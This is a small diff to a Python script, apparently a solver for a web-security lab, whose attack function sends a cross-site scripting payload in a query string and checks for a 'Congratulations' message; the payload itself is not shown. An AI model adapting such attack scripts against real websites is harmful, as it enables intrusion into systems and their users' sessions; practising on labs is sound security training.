@@ -25,7 +25,7 @@ def attack(url):
     print(f"[+] sending xss payload : {xss_payload}")
 
     r = requests.get(url + postId_path + f"?{xss_payload}")
-    r = requests.get(url + postId_path + "?postId=2")
+    r = requests.get(url)
     
     if 'Congratulations' in r.text:
         print("[+] attack successfully")
